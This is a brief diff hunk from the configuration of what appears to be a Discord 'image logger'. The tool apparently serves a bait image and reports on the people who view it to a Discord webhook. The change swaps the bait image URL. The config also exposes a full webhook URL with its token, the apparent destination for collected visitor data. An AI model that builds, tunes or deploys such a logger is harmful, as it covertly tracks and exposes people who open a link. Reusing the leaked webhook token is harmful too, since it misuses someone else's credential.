@@ -13,7 +13,7 @@ __author__ = "zyvf"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1153778117261926431/MF8sheKE0zFTSMbtgcGwB75h7hpwTZyAtouW5eUQut8Omf6DDktb75iCz2k_GNbuJXko",
-    "image": "https://i.pinimg.com/1200x/de/7a/57/de7a5785c80477ec98b8e9bc1eb7c093.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.ibb.co/ByhmFzp/image-2023-09-25-164207404.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
